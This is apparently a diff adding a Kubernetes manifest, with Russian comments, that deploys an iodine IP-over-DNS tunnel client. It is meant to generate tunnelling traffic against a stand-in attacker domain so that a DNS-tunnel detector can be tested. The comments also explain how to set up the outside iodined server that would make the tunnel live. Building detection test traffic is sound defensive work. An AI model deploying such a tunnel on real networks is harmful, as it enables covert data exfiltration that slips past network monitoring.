@@ -1,0 +1,56 @@
+# Iodine client — IP-over-DNS. Генерирует трафик: HIGH_RATE, NULL_RECORD, MANY_ANSWERS.
+#
+# Требуется: снаружи кластера должен работать iodined (сервер).
+# 1) Поднять iodined на VPS/хосте с белым IP.
+# 2) Делегировать поддомен на этот сервер (NS-запись или A для t.yourdomain.com).
+# 3) Задать ATTACK_DOMAIN (например t.yourdomain.com) и задеплоить этот манифест.
+#
+# Без сервера под будет падать/рестартить — для теста детектора достаточно,
+# чтобы клиент периодически слал DNS-запросы (даже при неудачном подключении).
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: iodine-client
+  namespace: attack
+  labels:
+    app: attack-traffic
+    tool: iodine
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: attack-traffic
+      tool: iodine
+  template:
+    metadata:
+      labels:
+        app: attack-traffic
+        tool: iodine
+    spec:
+      containers:
+        - name: iodine
+          image: alpine:3.19
+          command: ["/bin/sh", "-c"]
+          args:
+            - |
+              apk add --no-cache iodine
+              NS="${ATTACK_NAMESERVER:-}"
+              if [ -n "$NS" ]; then
+                exec iodine -f -r -P "" "$ATTACK_DOMAIN" "$NS"
+              else
+                exec iodine -f -r -P "" "$ATTACK_DOMAIN"
+              fi
+          env:
+            - name: ATTACK_DOMAIN
+              value: "t.attack.example.com"
+            - name: ATTACK_NAMESERVER
+              value: ""
+          resources:
+            requests:
+              cpu: 50m
+              memory: 64Mi
+            limits:
+              cpu: 200m
+              memory: 128Mi
+      restartPolicy: Always
